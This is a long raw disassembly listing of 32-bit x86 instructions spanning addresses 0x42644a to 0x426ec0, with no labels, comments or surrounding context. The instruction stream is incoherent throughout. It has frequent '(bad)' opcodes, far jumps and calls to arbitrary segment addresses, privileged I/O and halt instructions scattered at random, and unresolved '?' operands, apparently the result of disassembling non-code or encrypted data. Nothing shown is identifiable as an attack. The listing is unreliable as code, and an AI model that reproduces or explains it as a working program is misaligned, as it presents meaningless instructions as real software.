  42644a:	mov    ecx,0xe98432c4
  42644f:	outs   dx,DWORD PTR ds:[esi]
  426450:	add    al,0x29
  426452:	lock jno 0x4263de
  426455:	xor    ch,BYTE PTR [eax-0x74]
  426458:	or     DWORD PTR [ebx+0x78],edx
  42645b:	lods   eax,DWORD PTR gs:[esi]
  42645d:	push   ss
  42645e:	jg     0x426422
  426460:	cmp    dl,bl
  426462:	xchg   ecx,eax
  426463:	pop    ecx
  426464:	jg     0x426462
  426466:	push   esp
  426467:	out    dx,eax
  426468:	addr16 cmp al,cl
  42646b:	out    dx,ax
  42646d:	fcom   st(5)
  42646f:	call   0x31d04b5f
  426474:	jmp    0xe40ea25c
  426479:	cdq    
  42647a:	mov    ds:0x1f5b4f16,eax
  42647f:	sbb    eax,DWORD PTR [edx]
  426481:	popf   
  426482:	jnp    0x426419
  426484:	sbb    BYTE PTR [ebp+0x4f2fd2ed],al
  42648a:	xchg   BYTE PTR [ecx],bh
  42648c:	mov    al,ds:0xfb86d2ff
	...
  4264f1:	add    BYTE PTR [eax],al
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [edx-0x4fb0f39c],edx
  426505:	cdq    
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0x92000001
  42650d:	jmp    DWORD PTR [eax-0x31]
  426510:	mov    BYTE PTR [edx-0x75c0f839],bl
  426516:	sbb    ecx,DWORD PTR [ebp-0x36]
  426519:	mov    dh,BYTE PTR ds:0x9d53ba20
  42651f:	push   eax
  426520:	stc    
  426521:	test   DWORD PTR [esi],0xa09c0eb0
  426527:	fcmovu st,st(4)
  426529:	xchg   edi,eax
  42652a:	cmp    al,0x32
  42652c:	ror    edi,0xe
  42652f:	test   ecx,esp
  426531:	xor    dh,al
  426533:	adc    DWORD PTR [edi-0x3d277588],eax
  426539:	sub    al,0x6b
  42653b:	idiv   DWORD PTR [ecx]
  42653d:	das    
  42653e:	xlat   BYTE PTR ds:[ebx]
  42653f:	pop    edx
  426540:	cdq    
  426541:	fist   WORD PTR [eax+0x6b]
  426544:	outs   dx,DWORD PTR ds:[esi]
  426545:	jne    0x426553
  426547:	mov    edx,0xd6e4ae93
  42654c:	or     ebx,DWORD PTR [edx-0x54]
  42654f:	cwde   
  426550:	pop    ds
  426551:	push   es
  426552:	jbe    0x426574
  426554:	jp     0x426522
  426556:	dec    ecx
  426557:	sahf   
  426558:	or     BYTE PTR [ebp+0x54827764],bl
  42655e:	xor    DWORD PTR [ecx],ebx
  426560:	ror    BYTE PTR [ebp-0x2afd0832],cl
  426566:	pop    esi
  426567:	sti    
  426568:	in     eax,0x94
  42656a:	(bad)  
  42656b:	mov    ?,WORD PTR [edx+0x15]
  42656e:	pop    edx
  42656f:	fld    st(2)
  426571:	add    DWORD PTR [ecx+0x60],esi
  426574:	cmp    ebp,DWORD PTR [edx-0x3329d305]
  42657a:	push   cs
  42657b:	retf   0xeb79
  42657e:	loop   0x426530
  426580:	sbb    DWORD PTR [esi],0x7a5d6cce
  426586:	mov    ecx,0xf2d37356
  42658b:	sbb    al,0x2f
  42658e:	xchg   esi,eax
  42658f:	push   0xf54facad
  426594:	sub    dl,0xf7
  426597:	pusha  
  426598:	test   al,0x95
  42659a:	sub    BYTE PTR [edi-0x30],bl
  42659d:	stos   BYTE PTR es:[edi],al
  42659e:	xchg   BYTE PTR [esp+ecx*1-0x60],ah
  4265a2:	adc    DWORD PTR [ebx+0x6f6103cd],eax
  4265a8:	cmp    cl,BYTE PTR ds:0x14a69c2b
  4265ae:	(bad)  
  4265af:	mov    edx,0x530c3696
  4265b4:	xor    eax,0xb718bac6
  4265b9:	or     eax,0x2043849c
  4265be:	hlt    
  4265bf:	data16 or ch,dl
  4265c2:	jecxz  0x42662a
  4265c4:	xchg   BYTE PTR [esi+0x6bb6eb5],dh
  4265ca:	pop    esi
  4265cb:	and    BYTE PTR [ecx-0x13],bh
  4265ce:	lods   al,BYTE PTR ds:[esi]
  4265cf:	jg     0x4265fe
  4265d1:	sbb    DWORD PTR [ebx+0x44],edi
  4265d4:	inc    bp
  4265d6:	mov    eax,ds:0x710c7e2a
  4265db:	cmc    
  4265dc:	and    BYTE PTR [ecx+eiz*8+0xedd075f],0x9e
  4265e4:	cmp    eax,0x567436b9
  4265e9:	add    al,0x37
  4265eb:	ror    DWORD PTR [eax+0x58],1
  4265ee:	(bad)  
  4265ef:	inc    ecx
  4265f0:	cmp    al,0x5e
  4265f2:	pop    ss
  4265f3:	mov    esp,0x93bb58fb
  4265f8:	xchg   ecx,eax
  4265f9:	or     dl,BYTE PTR [ecx-0x4a]
  4265fc:	pop    esp
  4265fd:	mov    edx,0xd1d55151
  426602:	retf   
  426603:	sub    eax,DWORD PTR [ebx+0x7bb7cdd9]
  426609:	mov    dh,0x44
  42660b:	mov    ebx,0x97f823e0
  426610:	ins    DWORD PTR es:[edi],dx
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x34bd6da4]
  426682:	push   edi
  426683:	shl    DWORD PTR [ebp+0x500019a],0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	call   0xcb5ed142
  426691:	or     ah,cl
  426693:	pushf  
  426694:	add    eax,0xe073f032
  426699:	sahf   
  42669a:	retf   0x77ac
  42669d:	dec    edx
  42669e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42669f:	sbb    al,BYTE PTR [ecx+0x1e]
  4266a2:	add    eax,0x45e2009c
  4266a7:	cmp    eax,DWORD PTR [ecx]
  4266a9:	jae    0x42665e
  4266ab:	sbb    ecx,esi
  4266ad:	iret   
  4266ae:	imul   ecx,DWORD PTR ds:0x198e38c3,0xffffff82
  4266b5:	(bad)  
  4266b7:	jge    0x426712
  4266b9:	fsubr  DWORD PTR [eax-0x5e]
  4266bc:	pop    edi
  4266bd:	div    BYTE PTR [ecx-0x7c]
  4266c0:	aam    0x3d
  4266c2:	xchg   esp,eax
  4266c3:	adc    DWORD PTR [esi],eax
  4266c5:	in     al,0x2a
  4266c7:	ret    0x6a07
  4266ca:	bound  ebx,QWORD PTR [edi-0x57]
  4266cd:	imul   ecx,DWORD PTR [edi-0x4cfee731],0xffffff87
  4266d4:	pop    ds
  4266d5:	add    ebx,DWORD PTR [esi+0x37]
  4266d8:	lds    edi,FWORD PTR [ebx-0x215a5545]
  4266de:	daa    
  4266df:	ret    
  4266e0:	inc    ecx
  4266e1:	outs   dx,DWORD PTR es:[esi]
  4266e3:	add    al,0xbc
  4266e5:	jns    0x4266bf
  4266e7:	mov    al,ds:0xe36ffc2
  4266ec:	inc    ecx
  4266ed:	dec    edx
  4266ee:	loopne 0x4266b1
  4266f0:	inc    ebx
  4266f1:	(bad)
  4266f5:	cmp    DWORD PTR [edx-0x2c],ebp
  4266f8:	pop    eax
  4266f9:	inc    ebx
  4266fa:	pop    ebx
  4266fb:	jl     0x4266d8
  4266fd:	and    ah,dh
  4266ff:	loop   0x426706
  426701:	and    DWORD PTR [edx],edi
  426703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426704:	or     al,0xe0
  426706:	ds (bad) 
  426708:	(bad)  
  426709:	nop
  42670a:	lods   eax,DWORD PTR ds:[esi]
  42670b:	jmp    0xff45:0x7cbccb65
  426712:	dec    ebx
  426713:	sbb    ah,dl
  426715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426716:	push   ecx
  426717:	(bad)
  42671b:	cdq    
  42671c:	xor    cl,BYTE PTR [ebx+0x42]
  42671f:	push   cs
  426720:	pop    ebp
  426721:	popf   
  426722:	mov    al,0x26
  426724:	stos   DWORD PTR es:[edi],eax
  426725:	call   0x5602:0xdf6308bf
  42672c:	scas   al,BYTE PTR es:[edi]
  42672d:	nop
  42672e:	aas    
  42672f:	pop    es
  426730:	mov    esp,0x5ff737d6
  426735:	dec    edx
  426736:	ja     0x42674e
  426738:	mov    ch,0x79
  42673a:	xor    eax,0xc4a61045
  42673f:	inc    ebp
  426740:	(bad)  
  426742:	mov    ch,0x5d
  426744:	push   ebx
  426745:	mov    ecx,0xe33a81bc
  42674a:	add    esi,DWORD PTR [ebp-0x1857f968]
  426750:	loopne 0x4267b5
  426752:	pop    ebx
  426753:	jge    0x4266eb
  426755:	aas    
  426756:	stos   DWORD PTR es:[edi],eax
  426757:	not    DWORD PTR [esi]
  426759:	stc    
  42675a:	ror    BYTE PTR [bp+di+0x1d61],cl
  42675f:	aam    0xa2
  426761:	push   0xffffffbb
  426763:	mov    dl,0x5a
  426765:	sub    eax,0x918630e
  42676a:	jmp    0x4267b9
  42676c:	inc    ebx
  42676d:	cmp    ebx,edi
  42676f:	mov    cl,0x7e
  426771:	mov    DWORD PTR [ecx],ecx
  426773:	sub    esi,0xb5e96785
  426779:	mov    edi,DWORD PTR [ebx-0x7e7c9082]
  42677f:	pusha  
  426780:	ds test dl,0xd9
  426784:	or     bl,cl
  426786:	out    dx,eax
  426787:	inc    eax
  426788:	lock mov al,0xbc
  42678b:	xor    al,0x65
  42678d:	jmp    0x0:0x978465
	...
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	daa    
  426801:	out    dx,al
  426802:	ins    BYTE PTR es:[edi],dx
  426803:	nop
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    BYTE PTR [edx],al
  42680d:	popf   
  42680e:	jns    0x426870
  426810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426811:	or     cl,BYTE PTR [eax-0x21]
  426814:	(bad)  
  426817:	and    esp,esp
  426819:	add    cl,BYTE PTR [esi+eax*4+0x39]
  42681d:	in     al,0x67
  42681f:	fstp   DWORD PTR [eax+0x58]
  426822:	jle    0x42687b
  426824:	ret    
  426825:	jge    0x42687f
  426827:	jne    0x42682b
  426829:	scas   al,BYTE PTR es:[edi]
  42682a:	or     esp,DWORD PTR [esi]
  42682c:	stc    
  42682d:	(bad)  
  42682f:	push   edx
  426830:	xor    ebp,eax
  426832:	aad    0xce
  426834:	sbb    eax,0x4e0c4cae
  426839:	sub    al,0x4e
  42683b:	shl    BYTE PTR [ebp+eax*4+0x57422ae],cl
  426842:	jmp    0x6b979aee
  426847:	or     eax,0x8e5e017f
  42684c:	std    
  42684d:	out    dx,eax
  42684e:	iret   
  42684f:	in     al,0xd1
  426851:	sub    dl,bl
  426853:	inc    esp
  426854:	sahf   
  426855:	pusha  
  426856:	daa    
  426857:	fwait
  426858:	imul   ecx,DWORD PTR [ebp-0x67],0x68e387a7
  42685f:	or     ebx,0x4df796e0
  426865:	and    cl,BYTE PTR [edi]
  426867:	push   ds
  426868:	or     ebp,DWORD PTR [esi+0x16c102df]
  42686e:	lods   eax,DWORD PTR ds:[esi]
  42686f:	(bad)  
  426870:	sti    
  426871:	sub    al,0xa9
  426873:	cdq    
  426874:	ins    DWORD PTR es:[edi],dx
  426875:	inc    ebx
  426876:	out    dx,al
  426877:	cmp    ebx,DWORD PTR [ebp-0x53cde25f]
  42687d:	mov    ds:0x6ccdfe06,al
  426882:	retf   0x9e2b
  426885:	push   edx
  426886:	cmp    DWORD PTR ds:0x42038f79,edx
  42688c:	and    edx,DWORD PTR [edx+0x21950186]
  426892:	ins    BYTE PTR es:[edi],dx
  426893:	mov    eax,0x14fe1518
  426898:	lahf   
  426899:	stos   DWORD PTR es:[edi],eax
  42689a:	pop    edx
  42689b:	jge    0x4268da
  42689d:	out    0xda,eax
  42689f:	or     edi,0xffffffde
  4268a2:	adc    eax,ecx
  4268a4:	addr16 fsubp st(0),st
  4268a7:	lock cmp bl,BYTE PTR [ecx-0x6d4de87d]
  4268ae:	ficom  DWORD PTR [esi+0x2c688dee]
  4268b4:	gs repnz dec ecx
  4268b7:	(bad)  
  4268b9:	cmp    eax,0xf144a7e4
  4268be:	frstor [esi+0x30554608]
  4268c4:	inc    esp
  4268c5:	imul   ebx,DWORD PTR [eax+0x30],0xffffffef
  4268c9:	cmc    
  4268ca:	and    cl,BYTE PTR [ecx]
  4268cc:	lods   eax,DWORD PTR ds:[esi]
  4268cd:	xchg   edx,eax
  4268ce:	adc    ch,0x1
  4268d1:	xchg   esp,eax
  4268d2:	pop    ds
  4268d3:	jae    0x42693a
  4268d5:	call   0x1715595b
  4268da:	pop    es
  4268db:	test   eax,0x9744f777
  4268e0:	(bad)  [ecx]
  4268e2:	(bad)  
  4268e3:	sbb    al,BYTE PTR [ecx+0x63]
  4268e6:	sbb    DWORD PTR [esi+0x7a38d0a9],esi
  4268ec:	sub    al,0xe5
  4268ee:	iret   
  4268ef:	imul   edx,DWORD PTR [esp+eax*1-0x67],0xfac74d9d
  4268f7:	and    DWORD PTR [ebx],esi
  4268f9:	sub    al,0x39
  4268fb:	fidivr WORD PTR [esp+edx*8]
  4268fe:	pop    edx
  4268ff:	mov    esp,DWORD PTR [edi]
  426901:	cmc    
  426902:	push   ds
  426903:	and    BYTE PTR [ebx+0x6e],ah
  426906:	(bad)  
  426907:	mov    ah,al
  426909:	bound  esi,QWORD PTR [esi]
  42690b:	outs   dx,DWORD PTR ds:[esi]
  42690c:	push   0x1ba88259
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    ebx,DWORD PTR ds:0xbf908dd8
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0x93000001
  42698d:	loope  0x426929
  42698f:	or     ebx,esp
  426991:	sbb    al,0x3b
  426993:	mov    edx,edx
  426995:	xchg   BYTE PTR [edi-0x62c56ce6],cl
  42699b:	cmp    dh,cl
  42699d:	cmp    eax,0xcd83b637
  4269a2:	cs push esp
  4269a4:	sub    bp,0x73
  4269a8:	jge    0x4269f7
  4269aa:	cmp    BYTE PTR [edx-0x24],0xdd
  4269ae:	push   esp
  4269af:	add    BYTE PTR [esi],0x29
  4269b2:	dec    ecx
  4269b3:	or     ebp,DWORD PTR ds:0xe5d544d7
  4269b9:	add    eax,0x3d4fcf78
  4269be:	lods   eax,DWORD PTR ds:[esi]
  4269bf:	inc    ebx
  4269c0:	and    al,0xc2
  4269c2:	data16 sbb bl,BYTE PTR [edi]
  4269c5:	sub    DWORD PTR [edi+0x7a],edx
  4269c8:	(bad)  
  4269c9:	call   0xadec:0xae9e1a8a
  4269d0:	add    al,dl
  4269d2:	inc    ecx
  4269d3:	(bad)  
  4269d4:	cld    
  4269d5:	add    dl,0x7a
  4269d8:	sahf   
  4269d9:	jg     0x426a3b
  4269db:	or     edi,DWORD PTR [edi]
  4269dd:	jecxz  0x4269a5
  4269df:	pop    ecx
  4269e0:	sbb    ebx,DWORD PTR [ebx+0x4b]
  4269e3:	sbb    ecx,DWORD PTR ds:0x80a9c6aa
  4269e9:	dec    eax
  4269ea:	or     al,BYTE PTR [edx-0x61825728]
  4269f0:	js     0x426997
  4269f2:	push   ebp
  4269f3:	add    eax,0xdbe78f57
  4269f8:	sbb    ecx,DWORD PTR [ecx]
  4269fa:	mov    bl,0x45
  4269fc:	mov    ecx,0xe214a25e
  426a01:	ror    BYTE PTR [ebx+ebx*1-0xf55a141],1
  426a08:	add    DWORD PTR [edx+0x5d],0xef33e5a6
  426a0f:	push   0x21
  426a11:	in     al,0xb0
  426a13:	xchg   edi,eax
  426a14:	aaa    
  426a15:	imul   ebp,esi,0x29
  426a18:	in     al,0x5b
  426a1a:	cmp    al,0x6f
  426a1c:	fcompp 
  426a1e:	loopne 0x426a58
  426a20:	stos   BYTE PTR es:[edi],al
  426a21:	inc    ebx
  426a22:	sahf   
  426a23:	dec    ebx
  426a24:	xor    bl,BYTE PTR [ebp-0x6d30c65f]
  426a2a:	inc    esi
  426a2b:	fisttp WORD PTR [edi]
  426a2d:	mov    edx,DWORD PTR [ebp+ebx*1+0x4ccc3a6e]
  426a34:	mov    esp,DWORD PTR [eax-0x52]
  426a37:	nop
  426a38:	mov    dh,0x1d
  426a3a:	shl    BYTE PTR [ebx-0x33],0x37
  426a3e:	inc    edx
  426a3f:	fucomi st,st(1)
  426a41:	aaa    
  426a42:	xchg   esi,eax
  426a43:	inc    ebx
  426a44:	add    al,0x92
  426a46:	adc    DWORD PTR [eax],ebx
  426a48:	push   eax
  426a49:	xor    esp,DWORD PTR [eax+0x47]
  426a4c:	jnp    0x426a7c
  426a4e:	mov    dl,0xcb
  426a50:	sbb    ebp,DWORD PTR [bp-0xf72]
  426a55:	pop    esi
  426a56:	jns    0x426a27
  426a58:	mov    al,ds:0x76166442
  426a5d:	pop    ecx
  426a5e:	inc    esp
  426a5f:	in     al,0xa3
  426a61:	aas    
  426a62:	xchg   edi,eax
  426a63:	sbb    eax,0xa851ba9
  426a68:	lds    esi,FWORD PTR [edi-0x13]
  426a6b:	or     ecx,DWORD PTR [ecx+0x28]
  426a6e:	push   edx
  426a6f:	daa    
  426a70:	std    
  426a71:	mov    ah,0xd4
  426a73:	mov    ebp,esi
  426a75:	dec    eax
  426a76:	push   ss
  426a77:	adc    bl,BYTE PTR [ecx]
  426a79:	int    0xbc
  426a7b:	scas   al,BYTE PTR es:[edi]
  426a7c:	and    DWORD PTR [esi+0x7f],ebp
  426a7f:	push   cs
  426a80:	jo     0x426a08
  426a82:	shl    ebp,0x4b
  426a85:	push   esi
  426a86:	popa   
  426a87:	cmp    eax,0x2a74bb66
  426a8c:	xlat   BYTE PTR ds:[ebx]
  426a8d:	nop
  426a8e:	je     0x426b01
  426a90:	xor    eax,0x0
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x37
  426b01:	out    0xa9,al
  426b03:	mov    ah,0x9d
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    eax,0xb5000001
  426b0d:	add    al,0x7d
  426b0f:	adc    BYTE PTR [ebx-0x28],0xb6
  426b13:	mov    bl,0x6b
  426b15:	js     0x426b71
  426b17:	in     eax,0xed
  426b19:	imul   ebp,DWORD PTR [esp+edx*4],0x10c6f151
  426b20:	sbb    BYTE PTR [ecx+0x7a5a01f1],cl
  426b26:	call   0x67:0xac6f02c0
  426b2d:	pop    DWORD PTR [ebp+0x6d]
  426b30:	ins    BYTE PTR es:[edi],dx
  426b31:	mov    edx,0xc16b3475
  426b36:	outs   dx,DWORD PTR ds:[esi]
  426b37:	pop    edx
  426b38:	xchg   ebp,eax
  426b39:	inc    ecx
  426b3a:	xor    DWORD PTR [edx-0x8],edx
  426b3d:	ror    BYTE PTR [ebx],0x88
  426b40:	add    eax,0xc2f6a4b1
  426b45:	fdiv   QWORD PTR [edx]
  426b47:	sbb    DWORD PTR ds:0x55a1e00e,esi
  426b4d:	mov    ebx,0xafc961dc
  426b52:	sub    bl,BYTE PTR ds:0x41cdf288
  426b58:	leave  
  426b59:	add    ecx,edx
  426b5b:	add    ah,dh
  426b5d:	dec    ebp
  426b5e:	mov    ebx,0x9c050cc5
  426b63:	pushf  
  426b64:	arpl   WORD PTR [ebp-0x5e],bp
  426b67:	sub    DWORD PTR [si],ebx
  426b6a:	sbb    ch,BYTE PTR [esi]
  426b6c:	mov    WORD PTR [edx+ebx*4-0x67],ds
  426b70:	pop    esp
  426b71:	adc    ecx,esi
  426b73:	or     bl,BYTE PTR [edx+0x5b]
  426b76:	jae    0x426bf5
  426b78:	jo     0x426bbd
  426b7a:	and    cl,BYTE PTR [edx+0x156ff8b4]
  426b80:	hlt    
  426b81:	popf   
  426b82:	pop    bp
  426b84:	fiadd  WORD PTR [edi-0x31d7cfe]
  426b8a:	pop    ds
  426b8b:	fwait
  426b8c:	cmp    BYTE PTR [ecx],bl
  426b8e:	stos   BYTE PTR es:[edi],al
  426b8f:	aaa    
  426b90:	cmp    edi,DWORD PTR [edx-0xecdabc3]
  426b96:	into   
  426b97:	clc    
  426b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b99:	lock and BYTE PTR ds:0x8ff160b7,dl
  426ba0:	out    0x73,eax
  426ba2:	pop    ss
  426ba3:	stos   BYTE PTR es:[edi],al
  426ba4:	ss ret 
  426ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ba7:	pop    ss
  426ba8:	mov    cl,BYTE PTR [esi+0x79]
  426bab:	(bad)  
  426bac:	lea    edx,[edx+0x5f]
  426baf:	test   DWORD PTR [ebp+0x20],esp
  426bb2:	cmp    DWORD PTR [ebp+ebp*8+0x3a],edi
  426bb6:	cli    
  426bb7:	std    
  426bb8:	sub    al,0x63
  426bbb:	and    edi,DWORD PTR [ecx+0x55a44463]
  426bc1:	mov    bh,0x3c
  426bc3:	inc    edx
  426bc4:	out    dx,al
  426bc5:	and    BYTE PTR [ecx],cl
  426bc7:	cmp    esp,DWORD PTR [edx+0x22]
  426bca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bcb:	mov    edi,?
  426bcd:	push   ebx
  426bce:	inc    esi
  426bcf:	popa   
  426bd0:	pop    es
  426bd1:	je     0x426c05
  426bd3:	cmp    ah,cl
  426bd5:	mov    ch,0x38
  426bd7:	or     al,0xe1
  426bd9:	les    esp,FWORD PTR [esi]
  426bdb:	test   ah,0xc3
  426bde:	sub    ebp,DWORD PTR [edi]
  426be0:	jecxz  0x426c4d
  426be2:	mov    al,ds:0xac22624f
  426be7:	clc    
  426be8:	les    eax,FWORD PTR [ecx-0x7490f77e]
  426bee:	(bad)  
  426bef:	cli    
  426bf0:	add    al,0x76
  426bf2:	mov    bl,0x1a
  426bf4:	or     eax,0xf3644780
  426bf9:	mov    esp,0xcefaa256
  426bfe:	jnp    0x426c24
  426c00:	cmp    eax,0xe9a4c480
  426c05:	inc    ebx
  426c06:	lea    edx,[edi+0x4c6375cb]
  426c0c:	dec    ah
  426c0e:	jg     0x426bad
  426c10:	push   cs
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x92a145a9
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x8b000001
  426c8d:	pop    eax
  426c8e:	data16 ins BYTE PTR es:[edi],dx
  426c90:	test   BYTE PTR [edx-0x365df0f4],cl
  426c96:	fbld   TBYTE PTR [ebx-0x7775afd6]
  426c9c:	cmp    DWORD PTR [eax-0x1e],esi
  426c9f:	xchg   BYTE PTR [eax-0x724b2c42],dl
  426ca5:	pop    edi
  426ca6:	and    esp,DWORD PTR [esi-0x6d]
  426ca9:	stc    
  426caa:	add    al,0x4c
  426cac:	mov    ds:0x8ac3362b,eax
  426cb1:	out    dx,eax
  426cb2:	js     0x426c70
  426cb4:	retf   0xbde7
  426cb7:	test   ebx,edi
  426cb9:	sbb    eax,0x4a70fc10
  426cbe:	jmp    0x3519:0x902294f2
  426cc5:	outs   dx,BYTE PTR ds:[esi]
  426cc6:	xor    DWORD PTR [edi+ebp*2+0x41d775f1],ebp
  426ccd:	xor    ebx,DWORD PTR [ebp-0xc36a0]
  426cd3:	cs std 
  426cd5:	les    edx,FWORD PTR [edi]
  426cd7:	mov    esp,0x19acc224
  426cdc:	loop   0x426c89
  426cde:	jmp    0xf2058811
  426ce3:	sar    BYTE PTR [ecx],cl
  426ce5:	or     al,BYTE PTR [edx]
  426ce7:	jp     0x426c90
  426ce9:	lds    ecx,FWORD PTR [esi+edi*4-0x2c]
  426ced:	pop    edi
  426cee:	sbb    ecx,DWORD PTR [edi+0x29e3db77]
  426cf4:	push   0xffffffc6
  426cf6:	adc    BYTE PTR [edi],bl
  426cf8:	push   ds
  426cf9:	pop    edi
  426cfa:	inc    ecx
  426cfb:	arpl   WORD PTR [esi+0x11fe88cb],dx
  426d01:	cmp    esp,0xffffffe0
  426d04:	push   edx
  426d05:	and    bl,0x61
  426d08:	ror    BYTE PTR [ecx+0x69d162c7],1
  426d0e:	mov    edi,DWORD PTR [ebx+0x4b]
  426d11:	cwde   
  426d12:	push   edx
  426d13:	inc    edi
  426d14:	int3   
  426d15:	mov    bh,0x68
  426d17:	lea    esi,[esp+eax*1]
  426d1a:	fwait
  426d1b:	pop    ds
  426d1c:	mov    ebp,0xb48e3a8e
  426d21:	dec    ebx
  426d22:	jmp    0x426cbe
  426d24:	sbb    bh,0x4e
  426d27:	and    al,BYTE PTR [edi-0x23b557f1]
  426d2d:	dec    ebx
  426d2e:	shr    DWORD PTR [edx],cl
  426d30:	sub    BYTE PTR [edi],0x3e
  426d33:	push   edx
  426d34:	pop    ebp
  426d35:	fsub   QWORD PTR [edx-0x1e]
  426d38:	je     0x426cdc
  426d3a:	xchg   ecx,eax
  426d3b:	mov    ebp,0x39033dee
  426d40:	jp     0x426ce8
  426d42:	jecxz  0x426d31
  426d44:	(bad)  
  426d46:	sub    dl,al
  426d48:	xor    al,0x87
  426d4a:	mov    BYTE PTR [eax-0x2ce2194f],dl
  426d50:	jp     0x426da2
  426d52:	cmp    dh,BYTE PTR [esi+0x75425a09]
  426d58:	push   edi
  426d59:	mov    dh,0xc2
  426d5b:	loopne 0x426d3d
  426d5d:	bound  esi,QWORD PTR [ecx]
  426d5f:	hlt    
  426d60:	cmp    al,0x1
  426d62:	aas    
  426d63:	xchg   BYTE PTR [ebx],bh
  426d65:	sub    eax,0x4
  426d68:	cmp    cl,BYTE PTR [ebx]
  426d6a:	mov    ebx,0xb9bcfe4
  426d6f:	lea    esp,[edx]
  426d71:	lock lods eax,DWORD PTR ds:[esi]
  426d73:	les    esp,FWORD PTR [esi-0x29]
  426d76:	and    BYTE PTR [edx+0x2d],cl
  426d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d7a:	cmp    DWORD PTR [esi+0x23],eax
  426d7d:	out    dx,eax
  426d7e:	and    ebx,DWORD PTR [ebx]
  426d80:	mov    WORD PTR [edi],ds
  426d82:	cmp    al,0x89
  426d84:	jle    0x426dd9
  426d86:	fsub   DWORD PTR [esi+0x20]
  426d89:	mov    bh,0xec
  426d8b:	fdiv   DWORD PTR [ebx+0x40]
  426d8e:	stc    
  426d8f:	adc    al,0xea
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0x270c:0xc7c2ecf9
  426e01:	push   eax
  426e02:	mov    edi,0x19fce47
  426e07:	add    BYTE PTR ds:0xa8000001,al
  426e0d:	idiv   DWORD PTR [edx-0x7e]
  426e10:	mov    cs,WORD PTR [ebx-0x38c2eead]
  426e16:	das    
  426e17:	sbb    dl,dl
  426e19:	pop    ebx
  426e1a:	scas   al,BYTE PTR es:[edi]
  426e1b:	jae    0x426e09
  426e1d:	pop    ds
  426e1e:	push   0x46
  426e20:	push   0x273c1a4
  426e25:	rcl    DWORD PTR [esi+edi*1+0x4],1
  426e29:	les    ebx,FWORD PTR [ecx]
  426e2b:	test   eax,0x8af015e
  426e30:	inc    edi
  426e31:	mov    ds:0x2ff7c72b,al
  426e36:	in     eax,0xc9
  426e38:	mov    ds:0x564e56da,al
  426e3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e3e:	sub    eax,0x13
  426e41:	shl    BYTE PTR [edx+0x37],cl
  426e44:	enter  0x80d0,0x89
  426e48:	xchg   edi,eax
  426e49:	and    al,0x77
  426e4b:	jo     0x426e64
  426e4d:	cs xchg ebp,eax
  426e4f:	xchg   ebx,eax
  426e50:	(bad)  
  426e52:	mov    ds:0xd3693ff2,eax
  426e57:	les    esp,FWORD PTR [eax-0x6420204]
  426e5d:	es hlt 
  426e5f:	call   0xc19e:0x3c9932ea
  426e66:	std    
  426e67:	in     al,dx
  426e68:	cmp    DWORD PTR [ebx+0x26],edi
  426e6b:	scas   al,BYTE PTR es:[edi]
  426e6c:	dec    eax
  426e6d:	cmp    al,0xd
  426e6f:	add    edi,ecx
  426e71:	xchg   bl,dl
  426e73:	inc    ebx
  426e74:	cmp    al,0x13
  426e76:	mov    BYTE PTR [edx],bh
  426e78:	(bad)  
  426e79:	in     eax,0xaa
  426e7b:	nop
  426e7c:	mov    ds:0x27629b0c,eax
  426e81:	int    0x13
  426e83:	dec    esi
  426e84:	aaa    
  426e85:	rol    BYTE PTR [eax+0x4d5d6dd5],0xa0
  426e8c:	repz arpl WORD PTR [edx],ax
  426e8f:	dec    ecx
  426e90:	xchg   DWORD PTR [esi],esi
  426e92:	fdiv   QWORD PTR ds:0x90a1a27c
  426e98:	loopne 0x426e7b
  426e9a:	xor    DWORD PTR [ebx-0x20e0352c],ebp
  426ea0:	inc    edx
  426ea1:	les    edx,FWORD PTR [ebx-0x62]
  426ea4:	xchg   ebp,eax
  426ea5:	hlt    
  426ea6:	sbb    BYTE PTR [edx+0x33024cc7],ah
  426eac:	mov    edi,0xd7ce0e5c
  426eb1:	out    dx,al
  426eb2:	mov    esi,0xfcc6bddb
  426eb7:	loope  0x426e48
  426eb9:	fistp  DWORD PTR [esi+0x14]
  426ebc:	das    
  426ebd:	ret    0x99f0
  426ec0:	scas   al,BYTE PTR es:[edi]
